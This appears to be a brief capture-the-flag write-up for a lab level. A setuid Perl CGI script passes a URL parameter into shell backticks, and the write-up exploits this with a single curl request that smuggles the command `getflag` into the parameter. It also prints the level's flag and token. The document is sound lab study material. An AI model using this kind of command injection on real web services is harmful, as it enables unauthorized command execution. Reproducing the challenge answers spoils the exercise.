## FLAG: `qi0maab88jeaj46qoumi7maus`

## We have a perl script in Home
> ls -l
```
    total 4
    -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

> cat level04.pl
```
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
```
## ``# localhost:4747``         script running on `localhost:4747`
## ``x(param("x"));``           1 parameter `x`
## ``print `echo $y 2>&1`;``    Exploit : `echo getflag 2>&1`

------------------------------------------------

## We exploi this using `curl`
> curl localhost:4747?x=\`getflag\`
```
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```